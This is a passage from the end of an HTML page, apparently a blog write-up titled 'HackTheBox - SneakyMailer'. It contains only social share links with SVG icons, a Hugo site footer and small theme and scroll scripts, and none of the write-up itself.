36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - SneakyMailer on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsneakymailer%2f&title=HackTheBox%20-%20SneakyMailer&summary=HackTheBox%20-%20SneakyMailer&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsneakymailer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - SneakyMailer on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsneakymailer%2f&title=HackTheBox%20-%20SneakyMailer"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - SneakyMailer on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsneakymailer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - SneakyMailer on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20SneakyMailer%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsneakymailer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - SneakyMailer on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20SneakyMailer&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fsneakymailer%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>